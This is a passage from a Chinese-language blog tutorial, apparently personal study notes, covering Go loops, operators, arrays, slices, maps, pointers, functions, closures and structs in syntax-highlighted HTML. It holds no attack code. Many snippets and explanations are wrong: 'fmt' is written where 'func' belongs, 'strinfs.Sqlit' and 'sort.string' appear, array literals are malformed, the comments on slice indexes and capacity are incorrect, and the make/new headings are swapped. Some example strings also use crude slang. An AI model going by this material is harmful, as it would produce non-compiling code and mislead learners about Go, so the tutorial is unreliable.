spellcheck="true">/*以上语句中同c语言不同的是Go语言可以在if后临时进行变量的声明,但仅限于这个if语句（此时age变量的作用域仅在if语句这个作用域中）*/</span></code></pre><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> i<span class="token operator">=</span>0for <span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//第一种for循环，省略了初始语句</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> i<span class="token operator">=</span>0for i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        i<span class="token operator">++</span><span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//第二种for循环将结束语句移至循环体内部</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">for</span><span class="token punctuation">{</span>        语句<span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//死循环可以通过break等退出循环</span></code></pre><pre class=" language-go"><code class="language-go">s<span class="token operator">:=</span> <span class="token string">"hello 你好"</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>v<span class="token operator">:=</span><span class="token keyword">range</span> s<span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d %c\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">}</span>       <span class="token comment" spellcheck="true">/*将s这个字符串中每个字符的索引赋值给i字符内容赋值给v进行循环输出（一般一个中文字符会占用三个空间也就是说在s中的第5-7个空间中储存的是“你”这个字符）*/</span></code></pre><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>Go 语言支持的位运算符如下表所示。假定 A 为60，B 为13：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与运算符”&amp;”是双目运算符。 其功能是参与运算的两数各对应的二进位相与。</td><td align="left">(A &amp; B) 结果为 12, 二进制为 0000 1100</td></tr><tr><td align="left">|</td><td align="left">按位或运算符”|”是双目运算符。 其功能是参与运算的两数各对应的二进位相或</td><td align="left">(A | B) 结果为 61, 二进制为 0011 1101</td></tr><tr><td align="left">^</td><td align="left">按位异或运算符”^”是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。</td><td align="left">(A ^ B) 结果为 49, 二进制为 0011 0001</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移运算符”&lt;&lt;”是双目运算符。左移n位就是乘以2的n次方。 其功能把”&lt;&lt;”左边的运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td><td align="left">A &lt;&lt; 2 结果为 240 ，二进制为 1111 0000</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移运算符”&gt;&gt;”是双目运算符。右移n位就是除以2的n次方。 其功能是把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数。</td><td align="left">A &gt;&gt; 2 结果为 15 ，二进制为 0000 1111</td></tr></tbody></table><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">简单的赋值运算符，将一个表达式的值赋给一个左值</td><td align="left">C = A + B 将 A + B 表达式结果赋值给 C</td></tr><tr><td align="left">+=</td><td align="left">相加后再赋值</td><td align="left">C += A 等于 C = C + A</td></tr><tr><td align="left">-=</td><td align="left">相减后再赋值</td><td align="left">C -= A 等于 C = C - A</td></tr><tr><td align="left">*=</td><td align="left">相乘后再赋值</td><td align="left">C *= A 等于 C = C * A</td></tr><tr><td align="left">/=</td><td align="left">相除后再赋值</td><td align="left">C /= A 等于 C = C / A</td></tr><tr><td align="left">%=</td><td align="left">求余后再赋值</td><td align="left">C %= A 等于 C = C % A</td></tr><tr><td align="left">&lt;&lt;=</td><td align="left">左移后赋值</td><td align="left">C &lt;&lt;= 2 等于 C = C &lt;&lt; 2</td></tr><tr><td align="left">&gt;&gt;=</td><td align="left">右移后赋值</td><td align="left">C &gt;&gt;= 2 等于 C = C &gt;&gt; 2</td></tr><tr><td align="left">&amp;=</td><td align="left">按位与后赋值</td><td align="left">C &amp;= 2 等于 C = C &amp; 2</td></tr><tr><td align="left">^=</td><td align="left">按位异或后赋值</td><td align="left">C ^= 2 等于 C = C ^ 2</td></tr><tr><td align="left">|=</td><td align="left">按位或后赋值</td><td align="left">C |= 2 等于 C = C | 2</td></tr></tbody></table><p>由于Go语言中无法进行对同一变量的再次声明赋值所以赋值的运算目前只能以以上为标准</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> a1 <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">bool</span>    <span class="token comment" spellcheck="true">//声明一个长度为3的bool类型的数组</span></code></pre><p>对数组进行初始化：</p><pre class=" language-go"><code class="language-go">al <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">bool</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//最简单的初始化</span>a10 <span class="token operator">:=</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//对a10进行初始化，且长度会自动推算</span>a5 <span class="token operator">:=</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//第一个空间位置为1，第五个空间位置为2</span></code></pre><p>二维套娃式数组：</p><p>实现的目标为：[[3,2],[4,5],[6,7]]</p><p>语句为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> a32 <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span>     <span class="token comment" spellcheck="true">//声明三个长度的数组且其中每个数据类型均为含有两个数据空间的数组</span>a32 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span>          <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//输出结果为：[[3,2],[4,5],[6,7]]</span></code></pre><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>由于Go语言中的数组长度有着限制在很多方面存在着限制，所以出现了切片的定义，它相对于数组来说长度没有限制但需要定义类型</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> s <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>                <span class="token comment" spellcheck="true">//定义一个int类型的名为s的切片</span><span class="token keyword">var</span> s2 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>            <span class="token comment" spellcheck="true">//定义一个string类型的名为s2的切片</span></code></pre><h3 id="切片的初始化"><a href="#切片的初始化" class="headerlink" title="切片的初始化"></a>切片的初始化</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> s <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">}</span>  s <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//定义一个int型的切片并通过手动赋值进行初始化</span><span class="token keyword">var</span> s1 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>s1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"cnm"</span><span class="token punctuation">,</span><span class="token string">"wdnmd"</span><span class="token punctuation">,</span><span class="token string">"wd"</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//定义一个string型的切片并进行初始化</span></code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">//判断切片是否为空，若为空则返回true不为空则返回false，</span><span class="token comment" spellcheck="true">//nill相当于一个判断函数会返回布尔值</span><span class="token function">cap</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                         <span class="token comment" spellcheck="true">//返回当前切片的容量（有多少个元素已用）</span></code></pre><pre class=" language-go"><code class="language-go">a <span class="token operator">:=</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span>s <span class="token operator">:=</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>                     <span class="token comment" spellcheck="true">//取a数组中索引从第0到第3的元素赋值给s切片</span>s1<span class="token operator">:=</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>                      <span class="token comment" spellcheck="true">//将a数组从开始到第四位赋值给s1切片</span>s2<span class="token operator">:=</span>a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                      <span class="token comment" spellcheck="true">//将a数组从第四位到倒数第二位赋值给s3切片</span>s3<span class="token operator">:=</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                       <span class="token comment" spellcheck="true">//将a数组从开始到倒数第二位赋值给s3切片</span></code></pre><p>对一个来自数组的切片我们可以对其进行再次切片，但我们会发现有些切片的容量会不太相同，这里Go语言有了一个定义：切片的容量为底层数组从切片的第一个元素到数组最后的元素数量，例如我们将一个7个元素的数组进行两个切片一个是s :=a[0:4] ，另一个s1:=a[:4]，这里两个切片的容量就会不一样了，第一个容量为7，而第二个则为4。</p><h3 id="make函数创造切片"><a href="#make函数创造切片" class="headerlink" title="make函数创造切片"></a>make函数创造切片</h3><pre class=" language-go"><code class="language-go">s1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//创造一个长度为5容量为10的int型的切片，</span><span class="token comment" spellcheck="true">//容量为10表示可以最多进行扩充5个空间（此切片最大占用10 个空间）</span></code></pre><p>其中若容量没有做相关的声明则默认与所定义的长度相同</p><h3 id="append函数对切片进行扩容"><a href="#append函数对切片进行扩容" class="headerlink" title="append函数对切片进行扩容"></a>append函数对切片进行扩容</h3><p>语法为：</p><pre class=" language-go"><code class="language-go">s1 <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s1 <span class="token punctuation">,</span> <span class="token string">"wdnmd"</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//将wndmd字符添加到s1切片中去并调用s1来接收返回值</span></code></pre><p>append函数的扩容相当于把现在扩容的切片的内存地址进行了转换，转换到了一个新的内存空间中，因为原本所分配给此切片的内存空间不能放下所扩容后的切片所以此时Go语言会重新分配给此切片一个新的内存大小，同时我们一定要有一个变量来接收append的返回值否则就会报错.</p><p>对于利用append函数进行扩容后，对新的切片容量大小的判断：</p><p>1.如果新申请的容量大于原来的二倍则最终容量会以你所申请的容量为准。</p><p>2.如果原本的切片容量小于1024则最终容量会是原本的二倍</p><p>3.如果原本的容量大于1024则最终容量会开始循环增加原来的四分之一，知道最终容量大于等于新申请的容量</p><p>4.上边第三步如果最终容量计算溢出则最终容量是新申请的容量</p><p>将两个切片进行合并语法：</p><pre class=" language-go"><code class="language-go">s1 <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s1 <span class="token punctuation">,</span> ss<span class="token operator">...</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//将s1切片和ss切片合并然后赋值给s1切片，</span><span class="token comment" spellcheck="true">//其中ss...表示将ss切片进行拆开然后将拆开后的值添加到s1中</span></code></pre><h3 id="copy函数对切片进行复制"><a href="#copy函数对切片进行复制" class="headerlink" title="copy函数对切片进行复制"></a>copy函数对切片进行复制</h3><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token function">copy</span><span class="token punctuation">(</span>目标切片 <span class="token punctuation">,</span> 源切片<span class="token punctuation">)</span></code></pre><p>copy函数是将源切片中的数值复制然后将其写入到目标切片中，与我们常见的a1 :[]=a 不同的是copy只是将值复制给了目标切片，而常见的a1 :[]=a这样的语法意思是a1和a所指向的储存地址均为a中所储存的数据地址。</p><h3 id="对切片进行元素的删除"><a href="#对切片进行元素的删除" class="headerlink" title="对切片进行元素的删除"></a>对切片进行元素的删除</h3><p>由于Go语言中没有对切片中元素的删除有明确的函数，所以我们使用以下语法进行切片中元素的删除：</p><pre class=" language-go"><code class="language-go">a1 <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//删除切片a1中的第二和三个元素</span></code></pre><h3 id="对切片中元素的排序"><a href="#对切片中元素的排序" class="headerlink" title="对切片中元素的排序"></a>对切片中元素的排序</h3><p>语法为：</p><pre class=" language-go"><code class="language-go">sort<span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">//对string类型的切片s1中元素进行排序</span></code></pre><h3 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h3><pre class=" language-go"><code class="language-go">s2 <span class="token operator">:=</span> strinfs<span class="token punctuation">.</span><span class="token function">Sqlit</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//将s1按照空格进行切片然后赋值给s2</span></code></pre><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><pre class=" language-go"><code class="language-go">n <span class="token operator">:=</span> <span class="token number">1111</span>                 <span class="token comment" spellcheck="true">//将1111赋值给n这个变量</span>p <span class="token operator">=</span><span class="token operator">&amp;</span>n                     <span class="token comment" spellcheck="true">//将变量n的地址赋给变量p</span>m <span class="token operator">=</span><span class="token operator">*</span>p                     <span class="token comment" spellcheck="true">//将变量p所指的内存中的数值赋值给m</span></code></pre><h3 id="指针的申请"><a href="#指针的申请" class="headerlink" title="指针的申请"></a>指针的申请</h3><h5 id="make函数申请指针"><a href="#make函数申请指针" class="headerlink" title="make函数申请指针"></a>make函数申请指针</h5><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">//申请一个int类型的新的指针，且该指针分配的有内存地址</span><span class="token keyword">var</span> a <span class="token operator">*</span><span class="token builtin">int</span>               <span class="token comment" spellcheck="true">//创建了一个int类型的指针，但该指针没有分配内存地址</span></code></pre><h5 id="new函数申请指针"><a href="#new函数申请指针" class="headerlink" title="new函数申请指针"></a>new函数申请指针</h5><p>make函数相对于new函数来说，它只用于对切片，map，chan进行指针的申请，但make函数比new函数使用的更为广泛</p><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>map类似于python中的字典，是键和值的组合，通过键来寻找值，这里引用其他人的解释：</p><pre class=" language-go"><code class="language-go">Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。Map 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。</code></pre><h3 id="map的创建和初始化"><a href="#map的创建和初始化" class="headerlink" title="map的创建和初始化"></a>map的创建和初始化</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> s1 <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span>              <span class="token comment" spellcheck="true">//创建一个名叫s1的map，其中key为string类型，值为int类型，</span><span class="token comment" spellcheck="true">//注意：一般这样创建的map均没有分配内存地址也就相当于nil为true的状态</span>s1 <span class="token operator">=</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span> <span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//对map s1进行初始化，对其分配的容量大小为10</span></code></pre><h3 id="map的赋值"><a href="#map的赋值" class="headerlink" title="map的赋值"></a>map的赋值</h3><pre class=" language-go"><code class="language-go">s1<span class="token punctuation">[</span><span class="token string">"wdnmd"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">18</span>         <span class="token comment" spellcheck="true">//表示向map s1中添加一个key为wdnmd值为18的map元素</span></code></pre><p>如果访问一个不存在的key，则返回的值为你所定义的map中该类型值所对应的零值</p><h3 id="map的删除"><a href="#map的删除" class="headerlink" title="map的删除"></a>map的删除</h3><p>语法：</p><pre class=" language-go"><code class="language-go"><span class="token function">delete</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token string">"wdnmd"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//表示删除名为s1的map中的wdnmd键同时也会删除该键所对应的值</span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre class=" language-go"><code class="language-go">语法为：<span class="token keyword">func</span> 函数名<span class="token punctuation">(</span>参数名<span class="token punctuation">)</span><span class="token punctuation">(</span>返回值<span class="token punctuation">)</span><span class="token punctuation">{</span>    函数内容<span class="token punctuation">}</span></code></pre><p>Go语言中的函数可以有返回值也可没有，参数可以有也可以没有，若有参数则一定要具体规定参数的类型，具体的用法同c语言没有太大的差距</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">s1</span> <span class="token punctuation">(</span>x <span class="token builtin">string</span><span class="token punctuation">,</span>y <span class="token operator">...</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>上边的实例表示函数名为s1的函数能够传入两个参数，其中y可以传入多个值，此时的y的类型为一个切片比如说：</p><pre class=" language-go"><code class="language-go">fmt <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">s1</span><span class="token punctuation">(</span><span class="token string">"wdnmd"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>此时s1函数中y变量的值为：1 2 3 4 5 6 7，同时y也可以是空值</p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><pre class=" language-go"><code class="language-go">unicode<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>unicode<span class="token punctuation">.</span>Han<span class="token punctuation">,</span>c<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">//判断c变量中是否有中文字符</span></code></pre><h6 id="defer函数"><a href="#defer函数" class="headerlink" title="defer函数"></a>defer函数</h6><pre class=" language-go"><code class="language-go"><span class="token keyword">defer</span> 执行的语句             <span class="token comment" spellcheck="true">//defer函数表示在此函数被关闭之前执行被defer的语句</span></code></pre><p>如果一个函数中有多个被defer的语句，则执行顺序为先执行最后被defer的语句，最后执行最先被defer的语句。（类似于栈结构），defer函数调用时所用的变量的值已经被固定，后续中该参数值的变化对已经被defer压入栈中的该参数无影响。</p><h6 id="字符串后缀比较函数"><a href="#字符串后缀比较函数" class="headerlink" title="字符串后缀比较函数"></a>字符串后缀比较函数</h6><pre class=" language-go"><code class="language-go">sstrings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> suffix<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//判断变量名为name的字符串是否以变量suffix结尾</span></code></pre><h3 id="参数和返回值的多样性"><a href="#参数和返回值的多样性" class="headerlink" title="参数和返回值的多样性"></a>参数和返回值的多样性</h3><pre class=" language-go"><code class="language-go">fmt <span class="token function">s1</span> <span class="token punctuation">(</span>x <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    函数体<span class="token punctuation">}</span>                                    <span class="token comment" spellcheck="true">//定义了一个参数为x且x的类型为返回值为int类型的函数的函数</span></code></pre><pre class=" language-go"><code class="language-go">fmt <span class="token function">s2</span><span class="token punctuation">(</span>x <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    函数体<span class="token punctuation">}</span>                                    <span class="token comment" spellcheck="true">//定义了一个参数为x且x的类型为返回值为int类型的函数，函数本身返回值为函数的函数</span></code></pre><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> f<span class="token operator">=</span> <span class="token keyword">func</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">}</span>                                  <span class="token comment" spellcheck="true">//定义了一个匿名函数，并将其返回值赋值给f变量，</span><span class="token comment" spellcheck="true">//此语法可以用到全局性的函数如果想要调用此函数语法为：f(10,20)</span></code></pre><p>如果想要在一个函数中嵌套一个函数则需要用到匿名函数，语法为：</p><pre class=" language-go"><code class="language-go">fmt <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    f1 <span class="token operator">:=</span><span class="token keyword">func</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>                               <span class="token comment" spellcheck="true">//将函数赋值给一个变量进行使用如果想要进行传参，方法同上</span></code></pre><p>或者为：</p><pre class=" language-go"><code class="language-go">fmt <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">func</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>                      <span class="token punctuation">}</span>                               <span class="token comment" spellcheck="true">//此语法中最后括号中的xy为你要传入的参数，同时此语法表示立即执行</span></code></pre><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>我们如果想通过一函数调用另一个函数但因为参数的原因无法实现，此时就需要用到闭包</p><p>下面以一个例子来进行具体实验</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    ret <span class="token operator">:=</span> <span class="token function">s1</span><span class="token punctuation">(</span>s2 <span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span>    <span class="token function">ret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">s1</span><span class="token punctuation">(</span>x <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span>m<span class="token punctuation">,</span>n <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    tmp<span class="token operator">:=</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">x</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">s2</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"这是s2"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>闭包相当于把一个函数进行了外包装，在以上代码中从main函数中开始调用了s1函数，根据参数可以看到我们调用了s2函数，同时传入int类型m和n参数，然后在s1函数中声明了一个赋值给tmp的匿名函数用来调用s2函数，并将m和n传入了s2中调用了s2中的语句，接着运行s1中的return将tmp赋值给ret变量，由于ret变量为函数类型，所以需要用函数调用语句来进行调用ret。</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>type语句定义自己的类型：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> mystring <span class="token builtin">string</span>              <span class="token comment" spellcheck="true">//定义一个新的类型名叫mystring，实际上为string类型</span></code></pre><p>类型别名：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> m <span class="token operator">=</span> <span class="token builtin">int</span>                      <span class="token comment" spellcheck="true">//想要声明某个变量为int类型，也可以将声明语句定义为：var w y 声明一个int类型的名叫w的变量，</span><span class="token comment" spellcheck="true">//相当于给int起了个小名，但类型别名仅能生效于代码编译前</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> person <span class="token keyword">struct</span><span class="token punctuation">{</span>    age <span class="token builtin">int</span>    sex <span class="token builtin">string</span>    name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token comment" 